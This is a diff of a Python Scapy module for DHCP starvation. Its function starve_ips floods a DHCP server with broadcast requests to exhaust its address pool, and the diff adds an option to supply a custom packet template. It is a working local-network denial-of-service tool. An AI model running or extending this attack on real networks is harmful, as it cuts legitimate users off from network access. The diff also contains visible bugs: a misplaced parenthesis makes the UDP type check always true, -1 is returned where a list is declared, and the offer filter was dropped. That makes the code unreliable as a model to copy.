@@ -2,12 +2,9 @@ from scapy.all import *
 import time
 import binascii
 import threading
-import sys
-from enum import Enum
 import inspect
 import random
 import mac
-from types import SimpleNamespace
 import logging
 
 import keepalive
@@ -16,11 +13,8 @@ logger = logging.getLogger()
 
 IP_GLOBAL_BROADCAST='255.255.255.255'
 
-args = SimpleNamespace()
-args.keep_alive=False
-args.keep_alive_while_starving=False
-args.sniff_interface : str = None
-args.ttl = 5
+PKT_TTL = 5
+SNIFF_INTERFACE = None
 
 
 def get_dhcp_type_value(dhcp_type : str):
@@ -145,9 +139,7 @@ def capture_my_dhcp_offer(dest_mac : str, interface : str = conf.iface , result_
     function_name = inspect.currentframe().f_code.co_name
 
     logger.info(f"{function_name} : sniffing on interface {interface} for dhcp offers for {dest_mac}")
-    
-    res = sniff(count=1, filter = f"udp and src port {DHCP_ATTS.SERVER_PORT} and dst port {DHCP_ATTS.CLIENT_PORT}", timeout=4, iface=args.sniff_interface,\
-            lfilter= lambda packet : is_my_dhcp_offer(packet, dest_mac))
+    res = sniff(count=1, filter = f"udp and src port {DHCP_ATTS.SERVER_PORT} and dst port {DHCP_ATTS.CLIENT_PORT}", timeout=4, iface=SNIFF_INTERFACE)
 
     if len(res) != 0:
         result_list[0] = res[0]
@@ -234,17 +226,25 @@ def is_bootp_reply(packet)->bool:
 
 
 
-def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface ,sniff_interface : str = conf.iface, ips_to_starve : int = 5, keep_alive = False)->list[tuple[str, str, str]]:
+def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface ,sniff_interface : str = conf.iface, ips_to_starve : int = 5, keep_alive = False, pkt_to_use : Packet = None)->list[tuple[str, str, str]]:
     """
     TODO check if dhcp request if acked
     TODO warn about NAKs
     starves ips at the given interface and returns a list of (ip, mac, interface) that are occupied in
     this starvation session
+    if pkt_to_use is provided, it will be used as packet template
     """
-
     template_udp_packet = Ether(dst=ETHER_BROADCAST)\
-                    / IP(dst=IP_GLOBAL_BROADCAST,src='0.0.0.0',ttl=args.ttl)\
-                    / UDP(dport=DHCP_ATTS.SERVER_PORT,sport=DHCP_ATTS.CLIENT_PORT)\
+                    / IP(dst=IP_GLOBAL_BROADCAST,src='0.0.0.0',ttl=PKT_TTL)\
+                    / UDP(dport=DHCP_ATTS.SERVER_PORT,sport=DHCP_ATTS.CLIENT_PORT)
+    if pkt_to_use:
+        if len(pkt_to_use.layers()) != 3 \
+                or type(pkt_to_use[0]) != Ether \
+                or type(pkt_to_use[1]) != IP \
+                or type(pkt_to_use[2] != UDP):
+                    return -1
+
+        template_udp_packet = pkt_to_use
 
     function_name = inspect.currentframe().f_code.co_name
     
